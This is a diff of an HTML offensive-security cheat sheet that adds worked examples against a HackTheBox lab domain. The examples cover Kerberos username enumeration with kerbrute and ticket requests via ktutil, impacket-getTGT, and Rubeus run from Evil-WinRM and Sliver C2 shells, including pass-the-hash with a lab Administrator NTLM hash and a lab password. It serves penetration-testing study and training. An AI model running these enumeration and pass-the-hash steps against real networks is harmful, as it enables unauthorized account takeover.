@@ -344,17 +344,44 @@ body.dark-mode #dynamicFormContainer button:hover {
     background: #424242;
 }
 </style>
-  <h3 id="users-enum">Users enum</h3>
+  <h3 id="usernames-enum">Usernames enum</h3>
 <p>
 <button data-tabset="set1" data-tabcontent="tab1" class="active">kerbrute</button>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">kerbrute userenum --domain &lt;DOMAIN&gt; --dc &lt;DC&gt; &lt;USERNAMES_FILE&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> kerbrute userenum --domain absolute.htb --dc dc.absolute.htb usernames.txt
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    __             __               __     
+</span></span></span><span class="line"><span class="cl"><span class="go">   / /_____  _____/ /_  _______  __/ /____ 
+</span></span></span><span class="line"><span class="cl"><span class="go">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+</span></span></span><span class="line"><span class="cl"><span class="go"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span></span><span class="line"><span class="cl"><span class="go">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Version: v1.0.3 (9dad6e1) - 09/24/24 - Ronnie Flathers @ropnop
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">2024/09/24 14:54:41 &gt;  Using KDC(s):
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/24 14:54:41 &gt;   dc.absolute.htb:88
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">2024/09/24 14:54:41 &gt;  [+] VALID USERNAME:       j.roberts@absolute.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/24 14:54:41 &gt;  [+] VALID USERNAME:       m.chaffrey@absolute.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/24 14:54:41 &gt;  [+] VALID USERNAME:       s.osvald@absolute.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/24 14:54:41 &gt;  [+] VALID USERNAME:       d.klay@absolute.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/24 14:54:41 &gt;  [+] VALID USERNAME:       j.robinson@absolute.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/24 14:54:41 &gt;  [+] VALID USERNAME:       n.smith@absolute.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/24 14:54:42 &gt;  Done! Tested 88 usernames (6 valid) in 0.491 seconds
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/ropnop/kerbrute">kerbrute</a></em></small></p></div></p>
 <h3 id="usernames-generator">Usernames generator</h3>
 <p>
 <button data-tabset="set2" data-tabcontent="tab1" class="active">username-anarchy</button>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">./username-anarchy -i &lt;USERS_FILE&gt; | tee &lt;USERNAMES_FILE&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> username-anarchy -i users.txt <span class="p">|</span> tee usernames.txt
+</span></span><span class="line"><span class="cl"><span class="go">james
+</span></span></span><span class="line"><span class="cl"><span class="go">jamesroberts
+</span></span></span><span class="line"><span class="cl"><span class="go">james.roberts
+</span></span></span><span class="line"><span class="cl"><span class="go">jamesrob
+</span></span></span><span class="line"><span class="cl"><span class="go">jamerobe
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/urbanadventurer/username-anarchy">username-anarchy</a></em></small></p></div></p>
 <hr>
 <h3 id="generate-kerberos-ticket-from-linux">Generate Kerberos ticket (From Linux)</h3>
@@ -368,8 +395,10 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span><span class="line"><span class="cl"><span class="go">sudo apt install krb5-user cifs-utils
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Step 1: Add domain controller to <span class="s1">&#39;/etc/hosts&#39;</span> <span class="o">(</span>Try different order <span class="k">if</span> not work<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="go">&lt;TARGET&gt; &lt;DC&gt; &lt;DOMAIN&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">10.10.11.181 dc.absolute.htb absolute.htb
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Step 2: Add domain controller as a DNS server to <span class="s1">&#39;/etc/resolv.conf&#39;</span> <span class="o">[</span>optional<span class="o">]</span>
 </span></span><span class="line"><span class="cl"><span class="go">nameserver &lt;TARGET&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">nameserver 10.10.11.181
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Step 3: Edit <span class="s1">&#39;/etc/krb5.conf&#39;</span> <span class="o">(</span>All uppercase<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[libdefaults]
@@ -385,29 +414,83 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">[domain_realm]
 </span></span></span><span class="line"><span class="cl"><span class="go">    .domain.internal = &lt;DOMAIN&gt;
 </span></span></span><span class="line"><span class="cl"><span class="go">    domain.internal = &lt;DOMAIN&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">[libdefaults]
+</span></span></span><span class="line"><span class="cl"><span class="go">    default_realm = ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[realms]
+</span></span></span><span class="line"><span class="cl"><span class="go">    ABSOLUTE.HTB = {
+</span></span></span><span class="line"><span class="cl"><span class="go">        kdc = DC.ABSOLUTE.HTB:88
+</span></span></span><span class="line"><span class="cl"><span class="go">        admin_server = DC.ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">        default_domain = ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">    }
+</span></span></span><span class="line"><span class="cl"><span class="go">    
+</span></span></span><span class="line"><span class="cl"><span class="go">[domain_realm]
+</span></span></span><span class="line"><span class="cl"><span class="go">    .domain.internal = ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">    domain.internal = ABSOLUTE.HTB
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Step 4: Sync <span class="nb">time</span> to domain controller
 </span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt;
-</span></span></span></code></pre></div><h4 id="2a-with-password">2a. With Password</h4>
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.absolute.htb
+</span></span></code></pre></div><h4 id="2a-with-password">2a. With Password</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">kinit &lt;USER&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> kinit m.lovegod
+</span></span><span class="line"><span class="cl"><span class="go">Password for m.lovegod@ABSOLUTE.HTB:
 </span></span></span></code></pre></div><h4 id="2b-with-ntlm-hash">2b. With NTLM hash</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">ktutil
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ktutil
+</span></span><span class="line"><span class="cl"><span class="go">ktutil:  
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">add_entry -p &lt;USER&gt;@&lt;DOMAIN&gt; -k 1 -key -e rc4-hmac
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">ktutil:  add_entry -p Administrator@ABSOLUTE.HTB -k 1 -key -e rc4-hmac
+</span></span></span><span class="line"><span class="cl"><span class="go">Key for Administrator@ABSOLUTE.HTB (hex): 
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">&lt;HASH&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Key for Administrator@ABSOLUTE.HTB (hex): 1f4a6093623653f6488d5aa24c75f2ea
+</span></span></span><span class="line"><span class="cl"><span class="go">ktutil:  
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">write_kt &lt;USER&gt;.keytab
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">ktutil:  write_kt Administrator.keytab
+</span></span></span><span class="line"><span class="cl"><span class="go">ktutil:  
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">exit
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">ktutil:  exit
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">kinit -V -k -t &lt;USER&gt;.keytab -f &lt;USER&gt;@&lt;DOMAIN&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> kinit -V -k -t Administrator.keytab -f Administrator@ABSOLUTE.HTB
+</span></span><span class="line"><span class="cl"><span class="go">Using default cache: /tmp/krb5cc_1000
+</span></span></span><span class="line"><span class="cl"><span class="go">Using principal: Administrator@ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">Using keytab: Administrator.keytab
+</span></span></span><span class="line"><span class="cl"><span class="go">Authenticated to Kerberos v5
 </span></span></span></code></pre></div><h4 id="3-check-ticket">3. Check ticket</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">klist
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> klist
+</span></span><span class="line"><span class="cl"><span class="go">Ticket cache: FILE:/tmp/krb5cc_1000
+</span></span></span><span class="line"><span class="cl"><span class="go">Default principal: Administrator@ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Valid starting     Expires            Service principal
+</span></span></span><span class="line"><span class="cl"><span class="go">09/24/24 21:56:09  09/25/24 07:56:09  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">        renew until 09/25/24 21:56:08
 </span></span></span></code></pre></div></div>
 
 <div class="tabcontent" data-tabset="set3" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
 </span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-getTGT &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s DC.ABSOLUTE.HTB <span class="o">&amp;&amp;</span> impacket-getTGT <span class="s1">&#39;ABSOLUTE.HTB/m.lovegod&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Password:
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving ticket in m.lovegod.ccache
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With <span class="nb">hash</span>
 </span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-getTGT -hashes :&lt;HASH&gt; &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s DC.ABSOLUTE.HTB <span class="o">&amp;&amp;</span> impacket-getTGT -hashes :1f4a6093623653f6488d5aa24c75f2ea <span class="s1">&#39;ABSOLUTE.HTB/Administrator&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Saving ticket in Administrator.ccache
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Import ticket
 </span></span><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=&lt;USER&gt;.ccache
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check ticket
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check ticket
 </span></span><span class="line"><span class="cl"><span class="go">klist
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> klist
+</span></span><span class="line"><span class="cl"><span class="go">Ticket cache: FILE:Administrator.ccache
+</span></span></span><span class="line"><span class="cl"><span class="go">Default principal: Administrator@ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Valid starting     Expires            Service principal
+</span></span></span><span class="line"><span class="cl"><span class="go">09/24/24 22:20:45  09/25/24 08:20:45  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">        renew until 09/25/24 22:20:45
 </span></span></span></code></pre></div></div></p>
 <h3 id="generate-kerberos-ticket-from-windows">Generate Kerberos ticket (From Windows)</h3>
 <p>
@@ -415,10 +498,105 @@ body.dark-mode #dynamicFormContainer button:hover {
 
 <div class="tabcontent" data-tabset="set4" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
 </span></span><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgt /user:&lt;USER&gt; /password:&#39;&lt;PASSWORD&gt;&#39; /enctype:AES256 /domain:&lt;DOMAIN&gt; /dc:&lt;DC&gt; /ptt /nowrap
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; .\rubeus.exe asktgt /user:m.lovegod /password:&#39;AbsoluteLDAP2022!&#39; /enctype:AES256 /domain:ABSOLUTE.HTB /dc:DC.ABSOLUTE.HTB /ptt /nowrap
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _
+</span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |
+</span></span></span><span class="line"><span class="cl"><span class="go">   _____) )_   _| |__  _____ _   _  ___
+</span></span></span><span class="line"><span class="cl"><span class="go">  |  __  /| | | |  _ \| ___ | | | |/___)
+</span></span></span><span class="line"><span class="cl"><span class="go">  | |  \ \| |_| | |_) ) ____| |_| |___ |
+</span></span></span><span class="line"><span class="cl"><span class="go">  |_|   |_|____/|____/|_____)____/(___/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  v2.2.0
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Ask TGT
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Using aes256_cts_hmac_sha1 hash: 7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Building AS-REQ (w/ preauth) for: &#39;ABSOLUTE.HTB\m.lovegod&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using domain controller: fe80::71ce:9b94:4962:d202%11:88
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] TGT request successful!
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIFpDCCBa ...[SNIP]... VURS5IVEI=
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[+] Ticket successfully imported!
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  ServiceName              :  krbtgt/ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">  ServiceRealm             :  ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">  UserName                 :  m.lovegod
+</span></span></span><span class="line"><span class="cl"><span class="go">  UserRealm                :  ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">  StartTime                :  9/24/2024 7:08:14 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  EndTime                  :  9/24/2024 11:08:14 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  RenewTill                :  9/24/2024 11:08:14 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  Flags                    :  name_canonicalize, pre_authent, initial, renewable
+</span></span></span><span class="line"><span class="cl"><span class="go">  KeyType                  :  aes256_cts_hmac_sha1
+</span></span></span><span class="line"><span class="cl"><span class="go">  Base64(key)              :  u2ScGZUzmFdmTGETruj0VhWSGwiKTg7dbQVabz0QZU8=
+</span></span></span><span class="line"><span class="cl"><span class="go">  ASREP (key)              :  7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With <span class="nb">hash</span>
-</span></span><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgt /user:&lt;USER&gt; /rc4:&#39;&lt;HASH&gt;&#39; /domain:&lt;DOMAIN&gt; /dc:&lt;DC&gt; /ptt /nowrap
+</span></span><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgt /user:&lt;USER&gt; /rc4:&lt;HASH&gt; /domain:&lt;DOMAIN&gt; /dc:&lt;DC&gt; /ptt /nowrap
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; .\rubeus.exe asktgt /user:Administrator /rc4:1f4a6093623653f6488d5aa24c75f2ea /domain:ABSOLUTE.HTB /dc:DC.ABSOLUTE.HTB /ptt /nowrap
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _
+</span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |
+</span></span></span><span class="line"><span class="cl"><span class="go">   _____) )_   _| |__  _____ _   _  ___
+</span></span></span><span class="line"><span class="cl"><span class="go">  |  __  /| | | |  _ \| ___ | | | |/___)
+</span></span></span><span class="line"><span class="cl"><span class="go">  | |  \ \| |_| | |_) ) ____| |_| |___ |
+</span></span></span><span class="line"><span class="cl"><span class="go">  |_|   |_|____/|____/|_____)____/(___/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  v2.2.0
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Ask TGT
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Using rc4_hmac hash: 1f4a6093623653f6488d5aa24c75f2ea
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Building AS-REQ (w/ preauth) for: &#39;ABSOLUTE.HTB\Administrator&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using domain controller: fe80::71ce:9b94:4962:d202%11:88
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] TGT request successful!
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIFpDCCBa ...[SNIP]... VURS5IVEI=
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[+] Ticket successfully imported!
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  ServiceName              :  krbtgt/ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">  ServiceRealm             :  ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">  UserName                 :  Administrator
+</span></span></span><span class="line"><span class="cl"><span class="go">  UserRealm                :  ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">  StartTime                :  9/24/2024 7:10:55 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  EndTime                  :  9/24/2024 5:10:55 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">  RenewTill                :  10/1/2024 7:10:55 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+</span></span></span><span class="line"><span class="cl"><span class="go">  KeyType                  :  rc4_hmac
+</span></span></span><span class="line"><span class="cl"><span class="go">  Base64(key)              :  Ge3n0tM7A0k4q2bJ+0F+uA==
+</span></span></span><span class="line"><span class="cl"><span class="go">  ASREP (key)              :  1F4A6093623653F6488D5AA24C75F2EA
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
 </span></span><span class="line"><span class="cl"><span class="go">klist
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; klist
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Current LogonId is 0:0x2e0e9d
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Cached Tickets: (2)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span>0&gt;     Client: Administrator @ ABSOLUTE.HTB
+</span></span><span class="line"><span class="cl"><span class="go">        Server: krbtgt/ABSOLUTE.HTB @ ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+</span></span></span><span class="line"><span class="cl"><span class="go">        Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize
+</span></span></span><span class="line"><span class="cl"><span class="go">        Start Time: 9/24/2024 7:10:55 (local)
+</span></span></span><span class="line"><span class="cl"><span class="go">        End Time:   9/24/2024 17:10:55 (local)
+</span></span></span><span class="line"><span class="cl"><span class="go">        Renew Time: 10/1/2024 7:10:55 (local)
+</span></span></span><span class="line"><span class="cl"><span class="go">        Session Key Type: RSADSI RC4-HMAC(NT)
+</span></span></span><span class="line"><span class="cl"><span class="go">        Cache Flags: 0x1 -&gt; PRIMARY
+</span></span></span><span class="line"><span class="cl"><span class="go">        Kdc Called:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span>1&gt;     Client: Administrator @ ABSOLUTE.HTB
+</span></span><span class="line"><span class="cl"><span class="go">        Server: HTTP/DC.ABSOLUTE.HTB @ ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+</span></span></span><span class="line"><span class="cl"><span class="go">        Ticket Flags 0x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate name_canonicalize
+</span></span></span><span class="line"><span class="cl"><span class="go">        Start Time: 9/24/2024 7:05:19 (local)
+</span></span></span><span class="line"><span class="cl"><span class="go">        End Time:   9/24/2024 17:03:25 (local)
+</span></span></span><span class="line"><span class="cl"><span class="go">        Renew Time: 0
+</span></span></span><span class="line"><span class="cl"><span class="go">        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+</span></span></span><span class="line"><span class="cl"><span class="go">        Cache Flags: 0x8 -&gt; ASC
+</span></span></span><span class="line"><span class="cl"><span class="go">        Kdc Called:
 </span></span></span></code></pre></div></div></p>
 <h3 id="generate-kerberos-ticket-from-c2">Generate Kerberos ticket (From C2)</h3>
 <p>
@@ -426,10 +604,100 @@ body.dark-mode #dynamicFormContainer button:hover {
 
 <div class="tabcontent" data-tabset="set5" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
 </span></span><span class="line"><span class="cl"><span class="go">rubeus -- &#39;asktgt /user:&lt;USER&gt; /password:&lt;PASSWORD&gt; /enctype:AES256 /domain:&lt;DOMAIN&gt; /dc:&lt;DC&gt; /ptt /nowrap&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sliver (helloworld) &gt; rubeus -- &#39;asktgt /user:m.lovegod /password:AbsoluteLDAP2022! /enctype:AES256 /domain:ABSOLUTE.HTB /dc:DC.ABSOLUTE.HTB /ptt /nowrap&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] rubeus output:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _                      
+</span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |                     
+</span></span></span><span class="line"><span class="cl"><span class="go">   _____) )_   _| |__  _____ _   _  ___ 
+</span></span></span><span class="line"><span class="cl"><span class="go">  |  __  /| | | |  _ \| ___ | | | |/___)
